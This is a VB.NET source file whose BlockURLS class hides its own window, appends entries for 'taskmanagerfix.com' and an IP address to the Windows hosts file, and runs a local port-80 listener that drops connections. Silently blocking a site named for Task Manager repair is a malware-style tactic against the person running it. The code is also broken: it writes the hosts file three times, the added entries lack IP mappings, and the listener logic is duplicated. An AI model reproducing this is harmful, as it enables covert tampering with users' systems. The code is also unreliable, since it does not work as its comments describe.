Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading

Public Class BlockURLS

    Sub EditHostsFile()
        Dim Hosts As String = Environment.SystemDirectory & "\drivers\etc\hosts"
        Dim sr As New StreamReader(Hosts)
        Dim input As String = sr.ReadToEnd()
        sr.Close()
        Dim output1 As String = input + vbNewLine + "taskmanagerfix.com"
        Dim output2 As String = input + vbNewLine + "www.taskmanagerfix.com"
        Dim output3 As String = input + vbNewLine + "192.185.170.193"
        Dim sw As New StreamWriter(Hosts)
        sw.Write(output1)
        sw.Write(output2)
        sw.Write(output3)
        sw.Close()
    End Sub

    Sub StartBlocker()
        'Declare a BlockListener
        Dim blocker As BlockListener
        'Declare a thread to run the server on
        Dim thread As Thread
        'Set the blocker to be a new "Block Listener"
        blocker = New BlockListener
        'Set the current thread to be a new thread ( so that there is no noticable performance drop for the main window )
        'It runs the function blocker.listen ( further described below )
        thread = New Thread(New ThreadStart(AddressOf blocker.listen))
        'Start the thread to run the function
        thread.Start()
        'Add a handler to handle a function whenever a user is blocked ( connected )
        'The event's name is Blocked and the callback function is Restart
        AddHandler blocker.Blocked, AddressOf User_Blocked
    End Sub

    'The function that handles whenever a user is blocked ( connected )
    Sub User_Blocked()
        'This function is called whenever a user is blocked
        MessageBox.Show("Blocked")
        'NOTE
        'For some reasons, sometimes there are more than one connection meaning
        'that the Blocked event is raised more than once in turn resulting in this function being called multiple times
        'usually 2-3 when the user actually only connects once.
        'To deal with this you can simply wait one second before you listen for connections again
    End Sub

    'The block to run the server on ( must be 80 to work with hosts file and browsers, 80 is default for webservers )
    Private port As Integer = 80
    'Declare a TcpListener called listener to act as the actual server
    Private listener As TcpListener
    'Declare a boolean for turning the server's blocking capabilities on or off
    Private BlockUsers As Boolean = True

    'Declare the event to be called whenever a user is blocked ( connected )
    Public Event Blocked As EventHandler

    'The main function of the BlockListener : listen | listen for incoming connections
    Public Sub listen()
        'Create a new listener to act as a server on the localhost with 80 as port
        listener = New TcpListener(IPAddress.Parse("127.0.0.1"), port)
        'Start the listener
        listener.Start()
        'For as long as BlockUsers is true / for as long as you should block users
        While (BlockUsers)
            'Create a connection to the user and wait for the user to connect
            Dim clientConnection As TcpClient = listener.AcceptTcpClient
            'Whenever the user connects, close the connection directly
            clientConnection.Close()
            'Raise the "Blocked" event with no event arguments, so that you can easily handle your blocking elsewhere
            RaiseEvent Blocked(Me, EventArgs.Empty)
        End While
        'When the BlockListener should no longer listen for incoming connections - stop the server ( for performance and compatibility )
        listener.Stop()
    End Sub

    Private Sub BlockURLS_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Me.Visible = False

        EditHostsFile()
        StartBlocker()
    End Sub

End Class

Public Class BlockListener
    'The block to run the server on ( must be 80 to work with hosts file and browsers, 80 is default for webservers )
    Private port As Integer = 80
    'Declare a TcpListener called listener to act as the actual server
    Private listener As TcpListener
    'Declare a boolean for turning the server's blocking capabilities on or off
    Private BlockUsers As Boolean = True

    'Declare the event to be called whenever a user is blocked ( connected )
    Public Event Blocked As EventHandler

    'The main function of the BlockListener : listen | listen for incoming connections
    Public Sub listen()
        'Create a new listener to act as a server on the localhost with 80 as port
        listener = New TcpListener(IPAddress.Parse("127.0.0.1"), port)
        'Start the listener
        listener.Start()
        'For as long as BlockUsers is true / for as long as you should block users
        While (BlockUsers)
            'Create a connection to the user and wait for the user to connect
            Dim clientConnection As TcpClient = listener.AcceptTcpClient
            'Whenever the user connects, close the connection directly
            clientConnection.Close()
            'Raise the "Blocked" event with no event arguments, so that you can easily handle your blocking elsewhere
            RaiseEvent Blocked(Me, EventArgs.Empty)
        End While
        'When the BlockListener should no longer listen for incoming connections - stop the server ( for performance and compatibility )
        listener.Stop()
    End Sub
End Class
